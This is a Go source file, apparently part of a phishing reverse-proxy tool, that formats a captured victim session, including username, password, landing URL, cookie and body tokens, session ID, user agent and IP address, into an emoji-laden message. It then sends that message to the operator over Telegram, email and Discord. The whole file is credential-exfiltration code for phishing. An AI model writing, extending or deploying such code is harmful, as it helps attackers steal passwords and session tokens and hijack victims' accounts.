package main

import (
	"encoding/json"
	"fmt"
	"time"
)

func formatSessionMessage(session Session) string {
	tokensJSON, _ := json.MarshalIndent(session.Tokens, "", "  ")
	httpTokensJSON, _ := json.MarshalIndent(session.HTTPTokens, "", "  ")
	bodyTokensJSON, _ := json.MarshalIndent(session.BodyTokens, "", "  ")
	customJSON, _ := json.MarshalIndent(session.Custom, "", "  ")

	// 检查 tokensJSON 是否为空
	if len(session.Tokens) == 0 {
		fmt.Println("Tokens are empty, not sending the message.")
		return ""
	}

	return fmt.Sprintf("✨ **Session Information** ✨\n\n"+
		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n \n"+

		"🆔 Tokens:        ➖ \n ``` \n [ %s ] \n ``` \n "+
		"🆔 HTTPTokens:    ➖ \n ``` \n [ %s ] \n ``` \n "+
		"🆔 BodyTokens:    ➖ \n ``` \n [ %s ] \n ``` \n "+
		"🆔 Custom:        ➖ \n ``` \n [ %s ] \n ``` \n "+
		"🆔 Session ID:    ➖ \n ``` \n [ %s ] \n ``` \n \n"+

		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %s\n"+
		"🕔 Update Time:   ➖ %s\n",
		session.Username,
		session.Password,
		session.LandingURL,

		string(tokensJSON), // Printing formatted JSON strings
		string(httpTokensJSON),
		string(bodyTokensJSON),
		string(customJSON),

		session.SessionID,
		session.UserAgent,
		session.RemoteAddr,
		time.Unix(session.CreateTime, 0).Format("2006-01-02 15:04:05"),  // Inline conversion
		time.Unix(session.UpdateTime, 0).Format("2006-01-02 15:04:05"),  // Inline conversion
	)
}

func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
	}

	message := formatSessionMessage(session)
	if message == "" {
		fmt.Println("Message is empty, no notification sent.")
		return // 不发送消息
	}

	fmt.Printf("------------------------------------------------------\n")
	fmt.Printf("Latest Session:\n")
	fmt.Printf(message)
	fmt.Printf("------------------------------------------------------\n")

	if config.TelegramEnable {
		sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message)
		if err != nil {
			fmt.Printf("Error sending Telegram notification: %v\n", err)
		}
	}

	if config.MailEnable {
		err := sendMailNotification(config.MailHost, config.MailPort, config.MailUser, config.MailPassword, config.ToMail, message)
		if err != nil {
			fmt.Printf("Error sending Mail notification: %v\n", err)
		}
	}

	if config.DiscordEnable {
		sendDiscordNotification(config.DiscordChatID, config.DiscordToken, message)
	}
}
